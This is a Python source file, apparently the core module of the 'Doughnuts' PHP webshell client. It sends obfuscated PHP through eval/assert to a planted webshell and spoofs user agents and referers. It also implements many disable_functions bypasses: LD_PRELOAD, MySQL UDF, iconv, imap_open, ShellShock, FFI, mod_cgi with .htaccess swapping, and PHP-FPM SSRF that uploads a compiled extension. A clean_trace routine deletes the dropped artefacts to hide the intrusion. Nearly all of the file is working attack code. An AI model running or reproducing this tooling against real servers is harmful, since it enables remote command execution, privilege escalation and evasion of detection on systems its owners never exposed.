from os import path, makedirs
from threading import Thread
from time import sleep
from re import match, sub
from base64 import b64decode, b64encode
from binascii import b2a_hex
from locale import getpreferredencoding
from platform import system
from pprint import pprint
from random import choice, randint, sample
from string import ascii_letters, digits
from subprocess import Popen, check_output
from types import MethodType
from urllib.parse import quote, unquote_plus, urlparse, urlunparse
from hashlib import md5
from uuid import uuid4
from codecs import getencoder
import zlib

import requests
from requests.adapters import HTTPAdapter
from prettytable import PrettyTable
from requests.models import complexjson
from requests.utils import guess_json_utf
from urllib3 import disable_warnings
from libs.functions.php_sql import get_php_handle__sql_command
from libs.functions.php_base64 import get_php_base64_encode, get_php_base64_decode
from libs.functions.php_fpm_eval import get_php_fpm_eval
from libs.functions.php_bp_obd import get_php_bp_obd
from libs.functions.php_g_encode import get_php_g_encode
from libs.functions.php_bp_sys import get_php_system
from libs.functions.php_ini import get_ini_value_code

from libs.config import color, gget, gset
from auxiliary.fpm.fpm import generate_ssrf_payload, generate_ssrf_code_payload, generate_base64_socks_payload, generate_base64_socks_code_payload, generate_extension

LEVEL = []
CONNECT_PIPE_MAP = {True: "│  ", False: "   "}
SYSTEM_TEMPLATE = None
Session = requests.Session()
LOCAL_ENCODING = getpreferredencoding()
ALPATHNUMERIC = ascii_letters + digits
RAND_KEY = str(uuid4())
UNITS = {"B": 1, "KB": 2**10, "MB": 2**20, "GB": 2**30, "TB": 2**40}
Session.mount('http://', HTTPAdapter(max_retries=2))
Session.mount('https://', HTTPAdapter(max_retries=2))


__version__ = "4.23.3"


disable_warnings()


def banner():
    logo_choose = randint(1, 3)
    if logo_choose == 1:
        print(
            r"""
  _____                    _                 _
 |  __ \                  | |               | |
 | |  | | ___  _   _  __ _| |__  _ __  _   _| |_ ___
 | |  | |/ _ \| | | |/ _` | '_ \| '_ \| | | | __/ __|
 | |__| | (_) | |_| | (_| | | | | | | | |_| | |_\__ \
 |_____/ \___/ \__,_|\__, |_| |_|_| |_|\__,_|\__|___/
                      __/ |
                     |___/

 """
        )
    if logo_choose == 2:
        print(
            r"""
    ____                    __                __
   / __ \____  __  ______ _/ /_  ____  __  __/ /______
  / / / / __ \/ / / / __ `/ __ \/ __ \/ / / / __/ ___/
 / /_/ / /_/ / /_/ / /_/ / / / / / / / /_/ / /_(__  )
/_____/\____/\__,_/\__, /_/ /_/_/ /_/\__,_/\__/____/
                  /____/

"""
        )
    if logo_choose == 3:
        print(
            r"""

 ________  ________  ___  ___  ________  ___  ___  ________   ___  ___  _________  ________
|\   ___ \|\   __  \|\  \|\  \|\   ____\|\  \|\  \|\   ___  \|\  \|\  \|\___   ___\\   ____\
\ \  \_|\ \ \  \|\  \ \  \\\  \ \  \___|\ \  \\\  \ \  \\ \  \ \  \\\  \|___ \  \_\ \  \___|_
 \ \  \ \\ \ \  \\\  \ \  \\\  \ \  \  __\ \   __  \ \  \\ \  \ \  \\\  \   \ \  \ \ \_____  \
  \ \  \_\\ \ \  \\\  \ \  \\\  \ \  \|\  \ \  \ \  \ \  \\ \  \ \  \\\  \   \ \  \ \|____|\  \
   \ \_______\ \_______\ \_______\ \_______\ \__\ \__\ \__\\ \__\ \_______\   \ \__\  ____\_\  \
    \|_______|\|_______|\|_______|\|_______|\|__|\|__|\|__| \|__|\|_______|    \|__| |\_________\
                                                                                     \|_________|

"""
        )
    print(color.green("Doughnut Version: %s\n" % __version__))


def base64_encode(data: str, encoding="utf-8"):
    return b64encode(data.encode(encoding=encoding)).decode()


def base64_decode(data: str, encoding="utf-8"):
    return b64decode(data.encode()).decode(encoding=encoding)


def hex_encode(data: str):
    return b2a_hex(data.encode()).decode()


def md5_file(file_path: str):
    md5_hash = None
    if path.isfile(file_path):
        f = open(file_path, 'rb')
        md5_obj = md5()
        md5_obj.update(f.read())
        hash_code = md5_obj.hexdigest()
        f.close()
        md5_hash = str(hash_code).lower()
    return md5_hash


def md5_encode(data: bytes):
    md5_obj = md5()
    md5_obj.update(data)
    hash_code = md5_obj.hexdigest()
    md5_hash = str(hash_code).lower()
    return md5_hash


def gzinflate(compressed: bytes) -> bytes:
    return zlib.decompress(compressed, -zlib.MAX_WBITS) if compressed else b''


def gzdeflate(data: bytes) -> bytes:
    compressor = zlib.compressobj(9, zlib.DEFLATED, -zlib.MAX_WBITS)
    compressed = compressor.compress(data)
    compressed += compressor.flush()
    return compressed


def size_to_human(num, suffix='B'):
    for unit in ['', 'K', 'M', 'G', 'T', 'P', 'E', 'Z']:
        if abs(num) < 1024.0:
            return "%3.1f %s%s" % (num, unit, suffix)
        num /= 1024.0
    return "%.1f%s%s" % (num, 'Yi', suffix)


def human_to_size(size):
    size = size.upper()
    if not match(r' ', size):
        size = sub(r'([KMGT]?B)', r' \1', size)
    number, unit = [string.strip() for string in size.split()]
    return int(float(number) * UNITS[unit])


def clean_trace():
    def get_clean_php(filename: str):
        system_clean_command = f"rm -f {filename} && echo success"
        return """$f=base64_decode("%s");
    if (!unlink($f)){
        %s
    }else{echo "success";}
    """ % (base64_encode(filename), get_system_code(system_clean_command))
    ld_preload_filename = gget("webshell.ld_preload_path", "webshell", None)
    udf_filename = gget("webshell.udf_path", "webshell", None)
    iconv_filename = gget("webshell.iconv_path", "webshell", None)
    iconv_gconv_modules_filename = gget(
        "webshell.iconv_gconv_modules_path", "webshell", None)
    clean_files = (ld_preload_filename, udf_filename,
                   iconv_filename, iconv_gconv_modules_filename)

    for each in clean_files:
        if (each):
            print(color.yellow("\nClean %s ...\n" % each))
            res = send(get_clean_php(each))
            if (res):
                text = res.r_text.strip()
                if ("success" in text):
                    print(color.green("Clean success\n"))
                else:
                    print(color.red("Clean failed\n"))
    if (udf_filename):
        print(color.yellow("\nClean udf ...\n"))
        execute_sql_command("delete from mysql.func where name='sys_eval';")

    gset("webshell.ld_preload_path", None, True, "webshell")
    gset("webshell.ld_preload_func", None, True, "webshell")
    gset("webshell.iconv_path", None, True, "webshell")
    gset("webshell.iconv_gconv_modules_path", None, True, "webshell")
    gset("webshell.udf_path", None, True, "webshell")
    gset("webshell.apache_mod_cgi", False, True, "webshell")
    gset("db_dbms", '', True, "webshell")
    gset("db_ext", '', True, "webshell")
    gset("db_connect_type", '', True, "webshell")
    gset("db_connected", False, True, "webshell")
    gset("db_host", '', True, "webshell")
    gset("db_username", '', True, "webshell")
    gset("db_password", '', True, "webshell")
    gset("db_dbname", '', True, "webshell")
    gset("db_port", 0, True, "webshell")


def r_json(self, **kwargs):
    if not self.encoding and self.r_content and len(self.r_content) > 3:
        encoding = guess_json_utf(self.r_content)
        if encoding is not None:
            try:
                return complexjson.loads(
                    self.r_content.decode(encoding), **kwargs
                )
            except UnicodeDecodeError:
                pass
    return complexjson.loads(self.r_text, **kwargs)


def randstr(string="", offset=8):
    return ''.join(sample(string, offset))


def trush(min_num=2, max_num=4):
    return randstr(ALPATHNUMERIC, randint(min_num, max_num))


def newfile(file_name):
    file_path = gget("webshell.download_path", "webshell")
    if not path.exists(file_path):
        makedirs(file_path)
    real_file_path = path.join(file_path, file_name).replace("\\", "/")
    with open(real_file_path, "w+"):
        ...
    return real_file_path


def fake_ua():
    user_agents = gget("user_agents", default=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",))
    return choice(user_agents).strip()


def fake_referer():
    i = randint(1, 6)
    random_params = ""
    for _ in range(randint(4, 8)):
        random_params += f"{trush()}={trush()}&"
    random_params = random_params.strip("&")
    if (i == 1):
        return f"https://www.google.{trush(2,2)}/url?{random_params}"
    elif (i == 2):
        return f"https://blog.csdn.net/{trush(5, 12)}/article/details/{randint(10000, 99999)}?{random_params}"
    elif (i == 3):
        return f"https://www.baidu.com/?q={trush(2,10)}&{random_params}"
    elif (i == 4):
        return f"https://www.google.com/?q={trush(2,10)}&{random_params}"
    elif (i == 5):
        return f"https://juejin.im/post/{randstr(ALPATHNUMERIC, 24)}?{random_params}"
    elif (i == 6):
        return f"https://juejin.im/post/{randstr(ALPATHNUMERIC, 24)}?{random_params}"


def update_prompt():
    verbose = gget("PROMPT.VERBOSE")
    prompt = f"doughnuts ({color.cyan(gget('webshell.netloc', 'webshell'))}) > "
    if verbose:
        prompt = f"{color.yellow(gget('webshell.pwd', 'webshell'))}    {color.green('PHP ' + gget('webshell.php_version', 'webshell'))}\n" + prompt
    gset("webshell.prompt", prompt)


def get_db_connect_code(host="", username="", password="", dbname="", port=""):
    host = host if host else gget("db_host", "webshell", "")
    username = username if username else gget("db_username", "webshell", "")
    password = password if password else gget("db_password", "webshell", "")
    dbname = dbname if dbname else gget("db_dbname", "webshell", "")
    port = port if port else gget("db_port", "webshell", "")
    connect_type = gget("db_connect_type", "webshell")
    dbms = gget("db_ext", "webshell")
    if (connect_type == "pdo"):
        extra_port = f"port={port};" if port else ""
        extra_dbname = f"dbname={dbname};" if dbname else ""
        return f'$dsn="{dbms}:host={host};{extra_port}{extra_dbname}";$con= new PDO($dsn,"{username}","{password}");'
    elif (connect_type == "mysqli"):
        connect_code = '$con=mysqli_connect(%s);'
        temp_code = ",".join([f'"{y}"' for y in filter(
            lambda x: x, (host, username, password, dbname, port))])
        return connect_code % temp_code
    return ""


def replace_disable_base64(code=""):
    if gget("webshell.disable_base64_decode", "webshell", False):
        code = code.replace(
            "base64_encode",
            gget(
                "webshell.base64_en_func",
                "webshell",
                ""))
        code = code.replace(
            "base64_decode",
            gget(
                "webshell.base64_de_func",
                "webshell",
                ""))
    return code


def get_sql_command_php(command, database, ruid, luid):
    connect_type = gget("db_connect_type", "webshell")
    connect_code = get_db_connect_code(dbname=database)
    command = base64_encode(command)
    if (connect_type == "pdo"):
        return get_php_handle__sql_command(connect_type) % (
            connect_code, command, luid, ruid, luid, ruid)
    elif (connect_type == "mysqli"):
        return get_php_handle__sql_command(connect_type) % (
            connect_code, command, luid, ruid, luid, ruid)
    else:
        return ""


def execute_sql_command(command, database: str = "", raw: bool = False):
    database = database if (database) else gget("db_dbname", "webshell")
    ruid = str(uuid4())
    luid = str(uuid4())
    res = send(get_sql_command_php(command, database, ruid, luid))
    if (not res):
        return ''
    rows = res.r_text.strip().split(ruid)
    if (raw):
        return [row.split(luid)[:-1] for row in rows[:-1]]
    elif (len(rows) > 1):
        info = rows[0].split(luid)[:-1]
        form = PrettyTable(info)
        for row in rows[1:-1]:
            row_data = row.split(luid)[:-1]
            if (row_data):
                form.add_row(row_data)
        return form
    return ''


def decode_g(result, key: str, options: bool):
    try:
        s = result.decode()
    except AttributeError:
        s = result

    s = unquote_plus(s, 'latin1')
    rlen = len(s)
    klen = len(key)
    keys = [key]

    for c in range(1, klen):
        for k in range(klen):
            key = key[:k] + chr((ord(key[(k + 1) % klen]) ^
                                 ord(key[k]))) + key[k + 1:]
        keys.append(key)

    for ct in range(klen - 1, -1, -1):
        kr = keys[ct][::-1]
        for i in range(rlen):
            s = s[:i] + chr(
                int(bin(ord(s[i]) ^ ord(kr[i % klen]))[2:].zfill(8)[::-1], 2) ^ ord(keys[ct][i % klen])) + s[i + 1:]

    de = getencoder("rot-13")(s)[0][::-1].encode("latin1")

    try:
        if (options):
            return de
        else:
            return de.decode("utf8")

    except UnicodeDecodeError:
        return b"" if options else ""


def _get_trigger_func_code(trigger_func):
    code = ""
    if (trigger_func == "mail"):
        code = "mail('','','','');"
    elif (trigger_func == "error_log"):
        code = "error_log('',1);"
    elif (trigger_func == "mb_send_mail"):
        code = "mb_send_mail('','','');"
    elif (trigger_func == "imap_mail"):
        code = 'imap_mail("1@a.com","0","1","2","3");'
    return code


def _bypass_open_base_dir():
    return get_php_bp_obd() % (uuid4())


def _encode_response(encode_recv):
    encode_head = "ob_start();" if encode_recv else ""
    encode_tail = get_php_g_encode(RAND_KEY) if encode_recv else ""
    return encode_head, encode_tail


def _fpm_eval_phpcode(url, phpcode, raw_key, password, params_dict):
    attack_type = gget("webshell.bdf_fpm.type", "webshell")
    host = gget("webshell.bdf_fpm.host", "webshell")
    port = gget("webshell.bdf_fpm.port", "webshell")
    sock_path = gget("webshell.bdf_fpm.sock_path", "webshell")

    if attack_type == "gopher":
        phpcode = get_php_fpm_eval(attack_type) % (
            generate_ssrf_code_payload(host, port, phpcode))

    elif attack_type == "sock":
        phpcode = get_php_fpm_eval(attack_type) % (
            sock_path, generate_base64_socks_code_payload(host, port, phpcode))

    elif attack_type == "http_sock":
        phpcode = get_php_fpm_eval(attack_type) % (
            host, port, generate_base64_socks_code_payload(host, port, phpcode))

    elif attack_type == "ftp":
        php_server_port = gget(
            "webshell.bdf_fpm.php_server_port", "webshell", False)

        random_ftp_port = randint(60000, 64000)
        if not php_server_port:
            random_php_server_port = random_ftp_port + randint(1, 1000)
            php_server_phpcode = get_system_code(
                "php -n -t /tmp -S 0.0.0.0:%s" % random_php_server_port, False)
            params_dict[raw_key][password] = php_server_phpcode

            t = Thread(target=send, kwargs={
                "phpcode": php_server_phpcode, "_in_system_command": True})
            t.setDaemon(True)
            t.start()

            gset("webshell.bdf_fpm.php_server_port",
                 random_php_server_port, True, "webshell")
            php_server_port = random_php_server_port

        ftp_server_phpcode = get_php_fpm_eval(attack_type) % (
            host.replace(".", ","), port, random_ftp_port)

        t = Thread(
            target=send,
            kwargs={
                "phpcode": ftp_server_phpcode,
                "_in_system_command": True})
        t.setDaemon(True)
        t.start()
        sleep(0.2)

        temp_filename = uuid4()

        phpcode = """function ob_end_clean(){}ob_start();%s$o=ob_get_clean();$o = end(explode('\\n\\n', str_replace('\\r', '', $o), 2));file_put_contents('/tmp/%s',$o);""" % (phpcode, temp_filename)
        phpcode = """file_put_contents('ftp://%s:%s/a', base64_decode('%s'));sleep(0.8);$fn='%s';print(file_get_contents('http://127.0.0.1:%s/'.$fn));unlink('/tmp/'.$fn);""" % (
            host, random_ftp_port, generate_base64_socks_code_payload(host, port, phpcode), temp_filename, php_server_port)

    params_dict[raw_key][password] = phpcode
    res = Session.post(url, verify=False, **params_dict)

    return res


def send(phpcode: str, raw: bool = False, **extra_params):
    # extra_params['quiet'] 不显示错误信息
    offset = 8
    is_encode_recv = gget("encode_recv", default=False)
    is_fpm_eval_code = gget("webshell.bdf_fpm.use_in_eval", "webshell", False)
    in_system_command = gget("webshell.in_system_command", "webshell", False)
    if in_system_command:
        gset("webshell.in_system_command", False, True, "webshell")

    quiet = False
    if ("quiet" in extra_params):
        del extra_params["quiet"]
        quiet = True

    if ("_in_system_command" in extra_params):
        del extra_params["_in_system_command"]
        in_system_command = True

    proxies = gget("proxies")
    url = gget("webshell.url", "webshell")
    params_dict = gget("webshell.params_dict", "webshell").copy()
    php_v7 = gget("webshell.v7", "webshell")
    password = gget("webshell.password", "webshell")
    raw_key = gget("webshell.method", "webshell")
    encode_functions = gget("webshell.encode_functions", "webshell")
    encode_pf = gget("encode.pf")
    params_dict.update(extra_params)

    if "data" not in params_dict:
        params_dict["data"] = {}
    head = randstr("!@#$%^&*()[];,.?", offset)
    tail = randstr("!@#$%^&*()[];,.?", offset)

    pwd_b64 = b64encode(
        gget(
            "webshell.pwd",
            "webshell",
            "Lg==").encode()).decode()
    raw_data = phpcode

    if not raw:
        encode_head, encode_tail = _encode_response(is_encode_recv)

        # 头部
        php_header = f"""error_reporting(0);ob_end_clean();print("{head}");{encode_head}"""
        php_base64_header = ""

        # 主体部分
        # -----------------------------------------------------------------------
        php_header = f"""{php_header}chdir(base64_decode("{pwd_b64}"));"""
        php_header = """
        try{
            %s
        } catch (Throwable $e) {}
        """ % php_header

        phpcode = php_header + phpcode

        if (gget("webshell.bypass_obd", "webshell")):
            phpcode = _bypass_open_base_dir() + phpcode

        phpcode += f"""{encode_tail}print("{tail}");"""

        # 如果base64被禁用
        if gget("webshell.disable_base64_decode", "webshell"):
            # 替换 base64_encode/base64_decode
            phpcode = replace_disable_base64(phpcode)
            # 设置base64处理头
            php_base64_header = get_php_base64_encode() + get_php_base64_decode()

        if (php_v7):
            phpcode = replace_disable_base64(
                f"""{php_base64_header}eval(base64_decode("{base64_encode(phpcode)}"));""")
        else:
            phpcode = replace_disable_base64(
                f"""{php_base64_header}assert(eval(base64_decode("{base64_encode(phpcode)}")));""")

        # -----------------------------------------------------------------------

    # 编码器处理
    for func in encode_functions:
        if func in encode_pf:
            phpcode = encode_pf[func].run(phpcode)
        elif ("doughnuts" in str(func)):
            _, salt = func.split("-")
            phpcode = encode_pf["doughnuts"].run(phpcode, salt)

    # 若传入点为cookie
    if (raw_key == "cookies"):
        phpcode = quote(phpcode)

    # 设置请求参数
    params_dict['headers']['User-agent'] = fake_ua()
    params_dict['headers']['Referer'] = fake_referer()
    params_dict[raw_key][password] = phpcode
    params_dict['proxies'] = proxies

    try:
        if is_fpm_eval_code and not in_system_command:
            res = _fpm_eval_phpcode(
                url, phpcode, raw_key, password, params_dict)
        else:
            res = Session.post(url, verify=False, **params_dict)
    except requests.RequestException as e:
        if (not quiet):
            print(color.red(f"\nRequest Error: {e}\n"))
        return

    if (res.apparent_encoding):
        res.encoding = encoding = res.apparent_encoding
    else:
        encoding = "utf-8"

    text = res.text
    content = res.content
    text_head_offset = text.find(head)
    text_tail_offset = text.find(tail)
    text_head_offset = text_head_offset + \
        offset if (text_head_offset != -1) else 0
    text_tail_offset = text_tail_offset if (
        text_tail_offset != -1) else len(text)
    con_head_offset = content.find(head.encode(encoding))
    con_tail_offset = content.find(tail.encode(encoding))
    con_head_offset = con_head_offset + \
        offset if (con_head_offset != -1) else 0
    con_tail_offset = con_tail_offset if (
        con_tail_offset != -1) else len(content)

    res.r_text = text[text_head_offset: text_tail_offset]
    res.r_content = content[con_head_offset: con_tail_offset]

    if (not raw and is_encode_recv):
        res.r_text = decode_g(res.r_text, RAND_KEY, False)
        res.r_content = decode_g(res.r_content, RAND_KEY, True)

    res.r_json = MethodType(r_json, res)

    if gget("DEBUG.SEND"):  # DEBUG
        print(color.yellow("-----DEBUG START------"))
        print(
            f"[{res.status_code}] {url} length: {len(res.r_text)} time: {res.elapsed.total_seconds()}",
            end="")
        print(f"raw: {color.green('True')}" if raw else '')
        for k, v in params_dict.items():
            print(f"{k}: ", end="")
            pprint(v)
        print("raw payload:\n" + raw_data)
        if (res.text):
            print(color.green("----DEBUG RESPONSE----"))
            print(res.r_text)
        else:
            print(color.green("----DEBUG RAW RESPONSE----"))
            print(res.text)
        print(color.yellow("------DEBUG END-------\n"))

    return res


def delay_send(time: float, phpcode: str, raw: bool = False, **extra_params):
    sleep(time)
    send(phpcode, raw, **extra_params)


def print_webshell_info():
    info = (
        gget("webshell.root", "webshell"),
        gget("webshell.os_version", "webshell"),
        gget("webshell.php_version", "webshell"),
        gget("webshell.server_version", "webshell"),
        gget("webshell.obd", "webshell", "None")
    )
    info_name = ("Web root:", "OS version:", "PHP version:",
                 "Server version:", "Open_basedir:")
    for name, info in zip(info_name, info):
        print(name + "\n    " + info + "\n")


def prepare_system_template(exec_func: str):
    global SYSTEM_TEMPLATE
    if not exec_func:
        SYSTEM_TEMPLATE = ''
    elif (exec_func == 'system'):
        SYSTEM_TEMPLATE = """ob_start();system(base64_decode("%s"));$o=ob_get_contents();ob_end_clean();"""
    elif (exec_func == 'exec'):
        SYSTEM_TEMPLATE = """$o=array();exec(base64_decode("%s"), $o);$o=join(chr(10),$o);"""
    elif (exec_func == 'passthru'):
        SYSTEM_TEMPLATE = """$o=array();passthru(base64_decode("%s"), $o);$o=join(chr(10),$o);"""
    elif (exec_func == 'proc_open'):
        SYSTEM_TEMPLATE = """$handle=proc_open(base64_decode("%s"),array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);$o=NULL;while(!feof($pipes[1])){$o.=fread($pipes[1],1024);}@proc_close($handle);"""
    elif (exec_func == 'shell_exec'):
        SYSTEM_TEMPLATE = """$o=shell_exec(base64_decode("%s"));"""
    elif (exec_func == 'popen'):
        SYSTEM_TEMPLATE = """$fp=popen(base64_decode("%s"),'r');$o=NULL;if(is_resource($fp)){while(!feof($fp)){$o.=fread($fp,1024);}}@pclose($fp);"""
    elif (exec_func == 'pcntl_exec'):
        filename = uuid4()
        SYSTEM_TEMPLATE = """$r='/tmp/%s';if(pcntl_fork() === 0) {$cmd = base64_decode("%s");$args = array("-c","$cmd 2>&1 1>$r");pcntl_exec("/bin/bash", $args);exit(0);}pcntl_wait($status);$o=file_get_contents('/tmp/%s');unlink('/tmp/%s');""" % (
            filename, "%s", filename, filename)


def get_system_code(command: str, print_result: bool = True, mode: int = 0):
    bdf_mode = gget("webshell.bypass_df", "webshell") if mode == 0 else mode
    print_command = "print($o);" if print_result else ""
    gset("webshell.in_system_command", True, True, "webshell")

    if (bdf_mode == 1):  # php7-backtrace
        return get_php_system(bdf_mode) % (
            base64_encode(command), print_command)

    elif (bdf_mode == 2):  # php7-gc
        return get_php_system(bdf_mode) % (
            base64_encode(command), print_command)

    elif (bdf_mode == 3):  # php7-json
        return get_php_system(bdf_mode) % (
            base64_encode(command), print_command)

    elif (bdf_mode == 4):  # LD_PRELOAD
        trigger_code = _get_trigger_func_code(
            gget("webshell.ld_preload_func", "webshell"))
        return get_php_system(bdf_mode) % (str(uuid4()), base64_encode(command), gget(
            "webshell.ld_preload_path", "webshell"), trigger_code, print_command)

    elif (bdf_mode == 5):  # FFI
        return get_php_system(bdf_mode) % (
            base64_encode(command), print_command)

    elif (bdf_mode == 6):  # COM
        return get_php_system(bdf_mode) % (
            base64_encode(command), print_command)

    elif (bdf_mode == 7):  # imap_open
        tmpname = str(uuid4())
        return get_php_system(bdf_mode) % (base64_encode(
            command), tmpname, tmpname, print_command, tmpname)

    elif (bdf_mode == 8):  # MYSQL-UDF
        connect_type = gget("db_connect_type", "webshell")
        if (connect_type == "pdo"):
            return get_php_system(bdf_mode)[connect_type] % (
                get_db_connect_code(), hex_encode(command), print_command)
        elif (connect_type == "mysql"):
            return get_php_system(bdf_mode)[connect_type] % (
                get_db_connect_code(), hex_encode(command), print_command)

    elif (bdf_mode == 9):  # php7-SplDoublyLinkedList
        return get_php_system(bdf_mode) % (
            print_command, base64_encode(command))

    elif (bdf_mode == 10):  # php-fpm
        bits = gget("webshell.arch", "webshell")
        is_win = gget("webshell.is_win", "webshell")
        ext_local_path = path.join(gget("root_path"), "auxiliary", "fpm")
        ext_name = "ant_x"
        ext_ext = ""
        if bits == 0:
            return """print("architecture error\\n");"""
        elif bits == 32:
            ext_name += "86."
        else:
            ext_name += "64."
        if is_win:
            ext_ext = "dll"
        else:
            ext_ext = "so"
        tmp_dir = gget("webshell.upload_tmp_dir",
                       "webshell").rstrip("/").rstrip("\\")
        directory_separator = gget("webshell.directory_separator", "webshell")
        ext_upload_path = tmp_dir + directory_separator + \
            str(uuid4()) + "." + ext_ext
        response_file = tmp_dir + directory_separator + randstr(ascii_letters)
        command += " > " + response_file

        ext_name += ext_ext
        ext_local_path = path.join(ext_local_path, ext_name)
        ext_bytes = generate_extension(ext_name, ext_local_path, command)

        phpcode = f"file_put_contents('{ext_upload_path}', base64_decode('{b64encode(ext_bytes).decode()}'));\n"
        attack_type = gget("webshell.bdf_fpm.type", "webshell")
        host = gget("webshell.bdf_fpm.host", "webshell")
        port = gget("webshell.bdf_fpm.port", "webshell")
        sleep_time = 1

        if attack_type == "gopher":
            phpcode += get_php_system(bdf_mode)[attack_type] % (
                generate_ssrf_payload(host, port, ext_upload_path), print_command)
        elif attack_type in ["sock", "http_sock"]:
            sock_path = gget("webshell.bdf_fpm.sock_path", "webshell")
            phpcode += """
                $sock_path='%s';
                $host='%s';
                $port=%s;
        """ % (sock_path, host, port)

            if attack_type == "sock":
                phpcode += get_php_system(bdf_mode)[attack_type]
            else:
                phpcode += get_php_system(bdf_mode)[attack_type]
            phpcode += "fwrite($sock, base64_decode('%s'));" % (
                generate_base64_socks_payload(host, port, ext_upload_path))
        elif attack_type == "ftp":
            random_ftp_port = randint(60000, 65000)
            phpcode += get_php_system(bdf_mode)[attack_type] % (
                host.replace(".", ","), port, random_ftp_port)

            t = Thread(target=send, kwargs={
                       "phpcode": phpcode, "_in_system_command": True})
            t.setDaemon(True)
            t.start()
            sleep(0.2)

            phpcode = "var_dump(file_put_contents('ftp://%s:%s/a', base64_decode('%s')));" % (
                host, random_ftp_port, generate_base64_socks_payload(host, port, ext_upload_path))

            send(phpcode, _in_system_command=True)
            phpcode = ""
            sleep_time = 0.8
        else:
            phpcode += "die('unknown attack type');"

        phpcode += f"sleep({sleep_time});$o=file_get_contents('{response_file}');unlink('{ext_upload_path}');unlink('{response_file}');{print_command}"
        return phpcode

    elif (bdf_mode == 11):  # apache_mod_cgi
        shellscript_name = randstr(ALPATHNUMERIC, 8) + ".dh"
        res = send(get_php_system(bdf_mode) %
                   (base64_encode(command), shellscript_name))
        real_shellscript_name = res.r_text

        # get shellscript url
        webshell_url = gget("webshell.url", namespace="webshell")
        parsed = list(urlparse(webshell_url))
        webshell_path = parsed[2]
        shellscript_path = "/" + \
            "/".join(webshell_path.split("/")[:-1]) + shellscript_name
        parsed[2] = shellscript_path
        shellscript_url = urlunparse(parsed)

        # request shellscript url and get result
        res = requests.get(shellscript_url)
        o = base64_encode(res.text.strip())
        phpcode = """$o=base64_decode('%s');%sunlink('%s');unlink(__DIR__.DIRECTORY_SEPARATOR.".htaccess");rename(__DIR__.DIRECTORY_SEPARATOR.".htaccess.bak", __DIR__.DIRECTORY_SEPARATOR.".htaccess");""" % (
            o, print_command, real_shellscript_name)
        return phpcode

    elif (bdf_mode == 12):  # iconv
        p = "/tmp/%s" % randstr(ALPATHNUMERIC, 8)
        pre_phpcode = get_php_system(bdf_mode) % (p, base64_encode(command))
        send(pre_phpcode, quiet=True)
        phpcode = """$p="%s";sleep(1);$o=file_get_contents($p);unlink($p);%s""" % (
            p, print_command)
        return phpcode

    elif (bdf_mode == 13):  # FFI-php_exec
        return get_php_system(bdf_mode) % (
            base64_encode(command), print_command)

    elif (bdf_mode == 14):  # php7-reflectionProperty
        return get_php_system(bdf_mode) % (
            base64_encode(command), print_command)

    elif (bdf_mode == 15):
        return get_php_system(bdf_mode) % (
            base64_encode(command), print_command)

    elif (bdf_mode == 16):  # ShellShock
        trigger_code = _get_trigger_func_code(
            gget("webshell.shellshock_func", "webshell"))
        if trigger_code.startswith("mail"):
            trigger_code = 'mail("a@127.0.0.1", "", "", "-bv");'
        return get_php_system(bdf_mode) % (
            str(uuid4()), trigger_code, base64_encode(command), print_command)
    elif (bdf_mode == 17):  # php-concat_function
        return get_php_system(bdf_mode) % (
            base64_encode(command), print_command)

    elif (gget("webshell.exec_func", "webshell") and SYSTEM_TEMPLATE):
        return SYSTEM_TEMPLATE % (base64_encode(command)) + print_command
    else:
        return """print("No system execute function\\n");"""


def is_windows(remote: bool = True):
    if (remote):
        return gget("webshell.iswin", "webshell")
    else:
        if (not gget("iswin")):
            flag = True if 'win' in system().lower() else False
            gset("iswin", flag)
        else:
            flag = gget("iswin")
        return flag


def has_env(env: str, remote: bool = True):
    if (is_windows(remote)):
        command = "where"
    else:
        command = "which"
    if (remote):
        if (not gget("webshell.has_%s" % env, "webshell")):
            flag = send(get_system_code(f"{command} {env}")).r_text
            gset("webshell.has_%s" % env, flag, namespace="webshell")
        else:
            flag = gget("webshell.has_%s" % env, "webshell")
    else:
        if (not gget("has_%s" % env)):
            try:
                flag = check_output(
                    [command, env]).decode(LOCAL_ENCODING).strip()
            except Exception:
                flag = ''
            gset("has_%s" % env, flag)
        else:
            flag = gget("has_%s" % env)
    return len(flag)


def open_editor(file_path: str, editor: str = "", edit_args: str = ""):

    if (editor):
        if (has_env(editor, False)):
            binpath = gget(f"has_{editor}")
            if ("\n" in binpath):
                binpath = binpath.split("\n")[0].strip()
        else:
            print(color.red(f"{editor} not found in local environment"))
            return False
    else:
        binpath = "notepad.exe" if (is_windows(False)) else "vi"

    if not path.exists(file_path):
        with open(file_path, "w+"):
            ...

    if editor.lower() in ["code", "vscode"] and not edit_args:
        edit_args = "--wait"

    edit_args = edit_args.split(" ")
    if edit_args[0]:
        command_args = [binpath] + edit_args + [file_path]
    else:
        command_args = [binpath, file_path]

    p = Popen(command_args)
    p.wait()
    returncode = p.returncode
    return True if returncode == 0 else False


def _print_tree(tree_or_node, depth=0, is_file=False, end=False):
    if (is_file):
        pipe = "└─" if (end) else "├─"
        connect_pipe = "".join([CONNECT_PIPE_MAP[_]
                               for _ in LEVEL[:depth - 1]])
        try:
            tree_or_node = b64decode(tree_or_node.encode()).decode('gbk')
        except Exception:
            pass
        if ("/" in tree_or_node):
            tree_or_node = tree_or_node.split("/")[-1]
        print(connect_pipe + pipe + tree_or_node)
    elif (isinstance(tree_or_node, list)):
        index = 0
        for v in tree_or_node:
            index += 1
            if (index == len(tree_or_node)):
                end = True
            _print_tree(v, depth + 1, is_file=True, end=end)  # 输出目录
    elif (isinstance(tree_or_node, dict)):
        index = 0
        LEVEL.append(True)
        for k, v in tree_or_node.items():
            index += 1
            if (index == len(tree_or_node)):
                end = True
            if (isinstance(v, (list, dict))):  # 树中树
                _print_tree(k, depth + 1, is_file=True, end=end)  # 输出目录
                if (end):
                    LEVEL[depth] = False
                _print_tree(v, depth + 1)  # 递归输出树x
            elif (isinstance(v, str)) or v is None:  # 节点
                _print_tree(v, depth + 1, is_file=True, end=end)  # 输出文件


def print_tree(name, tree):
    global LEVEL
    LEVEL = []
    print(name)
    _print_tree(tree)


def old_print_tree(origin_path: str, tree: dict, depth: int = 0):
    if depth:
        if not origin_path.isdigit() and tree:
            origin_path = color.blue(origin_path)
            if depth == 1:
                print("├──" + origin_path)
            else:
                print("│" + "  │" * (depth - 1) + "  " + "├─" + origin_path)
        else:
            depth -= 1

    else:
        print(origin_path)
    if isinstance(tree, dict):
        for k, v in tree.items():
            print_tree(k, v, depth + 1)
